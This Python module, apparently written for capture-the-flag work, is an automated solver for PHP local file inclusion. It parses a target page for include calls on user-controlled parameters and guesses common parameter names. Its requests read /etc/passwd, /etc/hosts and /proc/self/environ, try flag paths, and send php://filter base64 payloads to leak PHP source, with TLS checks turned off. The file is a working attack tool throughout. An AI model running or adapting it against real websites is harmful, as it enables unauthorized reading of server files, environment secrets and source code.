# -*- coding: utf-8 -*-
"""
PHP File Inclusion (LFI) 通用求解引擎 v1.0

覆盖的题型:
- PHP include/require/include_once/require_once + 用户可控参数
- 协议约束识别 (file://, php://filter, php://input, data:// 等)
- 路径遍历与 flag 文件自动发现
- php://filter base64 编码绕过 PHP 执行
- 源码解析 → 参数提取 → 智能 payload 选择

入口: auto_solve(url, on_progress) → dict with flag/status
"""

from __future__ import annotations
import re
import urllib.request
import urllib.parse
import ssl
import base64
import html
from typing import Optional, Callable, Dict, List, Tuple

__all__ = ['auto_solve', 'php_lfi_solve']


# ═══════════════════════════════════════════════════════════
#  HTTP utilities (local copy to avoid circular imports)
# ═══════════════════════════════════════════════════════════

_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'


def _http_raw(url: str, timeout: int = 8) -> Tuple[Optional[int], Optional[bytes], Optional[str]]:
    """Returns (status_code, body_bytes, error_str)."""
    try:
        req = urllib.request.Request(url, headers={'User-Agent': _USER_AGENT, 'Accept': '*/*'})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.status, resp.read(), None
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(), None
        except:
            return e.code, None, str(e)
    except Exception as e:
        return None, None, str(e)


def _http_text(url: str, timeout: int = 8) -> Optional[str]:
    """HTTP GET, return decoded text body or None."""
    code, body, err = _http_raw(url, timeout)
    if body is None:
        return None
    try:
        return body.decode('utf-8', errors='replace')
    except:
        try:
            return body.decode('latin-1')
        except:
            return body.decode('utf-8', errors='replace')


# ═══════════════════════════════════════════════════════════
#  Flag extraction
# ═══════════════════════════════════════════════════════════

_FLAG_RE = re.compile(r'[A-Za-z0-9_]{2,}\{[^}]{4,}\}')
_BAD_HTML = re.compile(r'&nbsp;|&lt;|&gt;|&amp;|else\{|echo[\s"]|function[\s(]|isset\(|preg_match')


def _extract_flag(text: str) -> Optional[str]:
    if not text:
        return None
    for m in _FLAG_RE.finditer(text):
        candidate = m.group(0)
        if not _BAD_HTML.search(candidate):
            return candidate
    return None


# ═══════════════════════════════════════════════════════════
#  PHP source parsing
# ═══════════════════════════════════════════════════════════

def _strip_tags(source: str) -> str:
    """Remove HTML/PHP tags for cleaner parsing."""
    # Remove PHP tags
    s = re.sub(r'<\?php.*?\?>', '', source, flags=re.DOTALL | re.IGNORECASE)
    s = re.sub(r'<\?=.*?\?>', '', s, flags=re.DOTALL)
    s = re.sub(r'<\?.*?\?>', '', s, flags=re.DOTALL)
    return s


# Patterns for PHP include/require
_INCLUDE_RE = re.compile(
    r'''(?:include|require)(?:_once)?\s*\(\s*
        (["'][^"']*["']\s*\.\s*)?        # group 1: optional hardcoded prefix like "file://"
        (\$_(?:GET|POST|REQUEST|COOKIE)\['([^']+)'\])
        (?:\s*\.\s*["'][^"']*["'])?     # optional hardcoded suffix
        \s*\)''',
    re.VERBOSE | re.IGNORECASE
)

# Alternative: more flexible match for include(...)
_INCLUDE_FLEX = re.compile(
    r'''(?:include|require)(?:_once)?\s*\(?\s*
        (["'][^"']*["']\s*\.\s*)?        # optional prefix string
        (\$_GET|\$_POST|\$_REQUEST|\$_COOKIE)
        \[['"]([^'"]+)['"]\]             # param name
        (\s*\.\s*["'][^"']*["'])?        # optional suffix
    ''',
    re.VERBOSE | re.IGNORECASE
)

# Detect wrapper constraints from source comments/text
_WRAPPER_HINTS = {
    'file://': r'file\s*协议|file://',
    'php://filter': r'php://filter|伪协议|过滤器',
    'php://input': r'php://input',
    'data://': r'data://|data\s*协议',
    'expect://': r'expect://',
    'allow_url_fopen': r'allow_url_fopen\s*=\s*(\w+)',
    'allow_url_include': r'allow_url_include\s*=\s*(\w+)',
}


def _parse_include(source: str) -> List[Dict]:
    """
    Parse PHP source for include/require calls with user-controllable input.
    Returns list of dicts:
    {'param_name': str, 'param_source': 'GET'|'POST'|'REQUEST'|'COOKIE',
     'prefix': str|None,  # hardcoded prefix like "file://"
     'suffix': str|None}
    """
    results = []

    # Strip HTML tags first (highlight_file output wraps code in <span>/<code>)
    clean = re.sub(r'<[^>]+>', '', source)
    candidates = [source, clean]
    for src_text in candidates:
        for pattern in [_INCLUDE_RE, _INCLUDE_FLEX]:
            for m in pattern.finditer(src_text):
                groups = m.groups()
                if len(groups) >= 3:
                    prefix = groups[0] if groups[0] else None
                    param_source = groups[1] if len(groups) > 1 else groups[0]
                    param_name = groups[2] if len(groups) > 2 else groups[1]
                elif len(groups) == 2:
                    param_source = groups[0]
                    param_name = groups[1]
                    prefix = None
                else:
                    continue

                # Normalize
                src = param_source.upper()
                if 'GET' in src:
                    src = 'GET'
                elif 'POST' in src:
                    src = 'POST'
                elif 'REQUEST' in src:
                    src = 'GET'  # default to GET
                elif 'COOKIE' in src:
                    src = 'COOKIE'
                else:
                    continue

                # Clean prefix
                if prefix:
                    prefix = prefix.strip().strip('"').strip("'").strip('.')
                    prefix = prefix.strip().strip('"').strip("'")
                if prefix and not prefix:
                    prefix = None

                results.append({
                    'param_name': param_name.strip("'").strip('"'),
                    'param_source': src,
                    'prefix': prefix,
                    'suffix': None,
                })

    # Deduplicate
    seen = set()
    unique = []
    for r in results:
        key = (r['param_name'], r['param_source'])
        if key not in seen:
            seen.add(key)
            unique.append(r)
    return unique


def _parse_hints(source: str) -> Dict:
    """Extract wrapper availability hints from source comments."""
    hints = {}
    for key, pattern in _WRAPPER_HINTS.items():
        m = re.search(pattern, source, re.IGNORECASE)
        if m:
            if key in ('allow_url_fopen', 'allow_url_include'):
                hints[key] = m.group(1).lower() == 'on'
            else:
                hints[key] = True
    return hints


# ═══════════════════════════════════════════════════════════
#  Attack strategies
# ═══════════════════════════════════════════════════════════

# Common flag locations
_FLAG_PATHS = [
    '/flag',
    '/flag.txt',
    '/flag.php',
    '/var/www/html/flag',
    '/var/www/html/flag.php',
    '/var/www/html/flag.txt',
    '/home/ctf/flag',
    '/home/flag',
    '/root/flag',
    '/root/flag.txt',
    '/tmp/flag',
]

# Path traversal probes
_LFI_PROBES = [
    ('/etc/passwd', 'root:'),
    ('/etc/hosts', 'localhost'),
    ('/proc/self/environ', 'PATH='),
]


def _build_url(base_url: str, param_name: str, payload: str) -> str:
    """Build test URL with the payload in the right parameter."""
    parsed = urllib.parse.urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    encoded = urllib.parse.quote(payload, safe='')
    return f"{base}?{param_name}={encoded}"


def _try_payload(url: str, param: str, payload: str, label: str,
                 on_progress=None) -> Optional[str]:
    """Try a single payload, return flag text or None."""
    test_url = _build_url(url, param, payload)
    text = _http_text(test_url, timeout=10)
    if text is None:
        if on_progress:
            on_progress('php_lfi', label, 'error')
        return None
    flag = _extract_flag(text)
    if flag:
        if on_progress:
            on_progress('php_lfi', label, f'flag! → {flag}')
        return flag
    return None


def php_lfi_solve(url: str, on_progress: Callable = None) -> dict:
    """
    PHP File Inclusion general solver.

    Steps:
    1. Fetch page, detect PHP include pattern
    2. Extract parameter name and prefix constraints
    3. Probe LFI capability
    4. Try flag file paths
    5. Try php://filter bypass for PHP files
    """
    def _log(stage, item, status):
        if on_progress:
            on_progress(stage, item, status)

    _log('php_lfi', 'fetch', 'Fetching page source…')

    # Step 1: Get source
    source = _http_text(url, timeout=10)
    if not source:
        return {'flag': None, 'status': 'no_source'}

    # Step 2: Parse include calls
    includes = _parse_include(source)
    hints = _parse_hints(source)

    _log('php_lfi', 'parse',
         f'{len(includes)} include(s) found, hints: {hints}')

    if not includes:
        # Fallback: scan common LFI params with common paths
        _log('php_lfi', 'fallback', 'No include detected, trying generic LFI')
        return _generic_lfi_scan(url, on_progress, _log)

    # Step 3: For each include, try attack
    flag_paths_with_precedence = list(_FLAG_PATHS)

    # If source mentions specific paths, prioritize them
    path_hints = re.findall(r'["\']([^"\']*(?:flag|secret)[^"\']*)["\']',
                            source, re.IGNORECASE)
    flag_paths_with_precedence = path_hints + flag_paths_with_precedence

    # If "/flag" is in the source, put it first
    if '/flag' not in flag_paths_with_precedence:
        flag_paths_with_precedence.insert(0, '/flag')

    # Deduplicate
    seen = set()
    unique_paths = []
    for p in flag_paths_with_precedence:
        if p not in seen:
            seen.add(p)
            unique_paths.append(p)
    flag_paths = unique_paths[:15]

    for inc in includes:
        param = inc['param_name']
        prefix = inc.get('prefix', '')
        source_type = inc['param_source']

        _log('php_lfi', 'param',
             f'testing param={param} source={source_type} prefix={prefix!r}')

        # Determine if we have a wrapper prefix
        wrapper_prefix = ''
        if prefix and prefix.startswith('file://'):
            wrapper_prefix = ''  # file:// just opens local files
        elif prefix and prefix.startswith('php://'):
            wrapper_prefix = prefix  # wrapper is already specified

        # Strategy A: Direct file read (works when prefix is file:// or empty)
        for fpath in flag_paths:
            payload = fpath
            flag = _try_payload(url, param, payload, fpath, on_progress)
            if flag:
                return {'flag': flag, 'param': param, 'path': fpath,
                        'strategy': 'direct_file', 'status': 'solved'}

        # Strategy B: php://filter bypass (for PHP files)
        # Use to extract source from files that would be executed
        for fpath in flag_paths:
            payload = f"php://filter/convert.base64-encode/resource={fpath}"
            text = _http_text(_build_url(url, param, payload), timeout=10)
            if text:
                flag = _extract_flag(text)
                if flag:
                    if on_progress:
                        on_progress('php_lfi', 'php://filter',
                                    f'flag! → {flag}')
                    return {'flag': flag, 'param': param, 'path': fpath,
                            'strategy': 'php_filter', 'status': 'solved'}

                # Try to base64 decode the response
                try:
                    # Strip HTML, find base64 block
                    b64_match = re.search(r'[A-Za-z0-9+/=]{20,}', text)
                    if b64_match:
                        decoded = base64.b64decode(b64_match.group(0))
                        decoded_text = decoded.decode('utf-8', errors='replace')
                        flag = _extract_flag(decoded_text)
                        if flag:
                            if on_progress:
                                on_progress('php_lfi', 'php://filter+decode',
                                            f'flag! → {flag}')
                            return {'flag': flag, 'param': param, 'path': fpath,
                                    'strategy': 'php_filter_b64decode', 'status': 'solved'}
                except:
                    pass

                # Also try alternate filter syntax
                alt_payload = f"php://filter/read=convert.base64-encode/resource={fpath}"
                text2 = _http_text(_build_url(url, param, alt_payload), timeout=10)
                if text2:
                    flag = _extract_flag(text2)
                    if flag:
                        if on_progress:
                            on_progress('php_lfi', 'php://filter v2',
                                        f'flag! → {flag}')
                        return {'flag': flag, 'param': param, 'path': fpath,
                                'strategy': 'php_filter_v2', 'status': 'solved'}

        # Strategy C: Path traversal probes
        for probe_path, expected in _LFI_PROBES:
            text = _http_text(_build_url(url, param, probe_path), timeout=10)
            if text and expected in text:
                _log('php_lfi', 'LFI confirmed',
                     f'{probe_path} → {expected}')
                # Now try flag paths
                for fpath in flag_paths:
                    flag = _try_payload(url, param, fpath, fpath, on_progress)
                    if flag:
                        return {'flag': flag, 'param': param, 'path': fpath,
                                'strategy': 'lfi_path_traversal', 'status': 'solved'}
                break

    return {'flag': None, 'status': 'no_flag_found'}


def _generic_lfi_scan(url: str, on_progress: Callable, _log: Callable) -> dict:
    """Generic LFI scan when no include pattern is detected."""
    lfi_params = ['file', 'page', 'include', 'path', 'template', 'view',
                  'document', 'read', 'load', 'dir', 'src', 'wrappers',
                  'filename', 'content', 'f']

    for param in lfi_params:
        # Probe with /etc/passwd
        text = _http_text(_build_url(url, param, '/etc/passwd'), timeout=8)
        if text and 'root:' in text:
            _log('php_lfi', 'LFI found', f'param={param}')
            # Flag hunt
            for fpath in _FLAG_PATHS:
                flag = _try_payload(url, param, fpath, fpath, on_progress)
                if flag:
                    return {'flag': flag, 'param': param, 'path': fpath,
                            'strategy': 'generic_lfi', 'status': 'solved'}

            # Also try to get current source
            for php_path in ['index.php', 'index', '.']:
                payload = f"php://filter/convert.base64-encode/resource={php_path}"
                text2 = _http_text(_build_url(url, param, payload), timeout=10)
                if text2:
                    try:
                        b64 = re.search(r'[A-Za-z0-9+/=]{30,}', html.unescape(text2))
                        if b64:
                            decoded = base64.b64decode(b64.group(0))
                            dt = decoded.decode('utf-8', errors='replace')
                            flag = _extract_flag(dt)
                            if flag:
                                return {'flag': flag, 'param': param,
                                        'strategy': 'php_filter_source', 'status': 'solved'}
                    except:
                        pass
            break

    _log('php_lfi', 'none', 'No LFI vulnerability detected')
    return {'flag': None, 'status': 'no_lfi'}


# ═══════════════════════════════════════════════════════════
#  Top-level entry
# ═══════════════════════════════════════════════════════════

def auto_solve(url: str, on_progress: Callable = None) -> dict:
    """Entry point for PHP file inclusion general solver."""
    return php_lfi_solve(url, on_progress=on_progress)
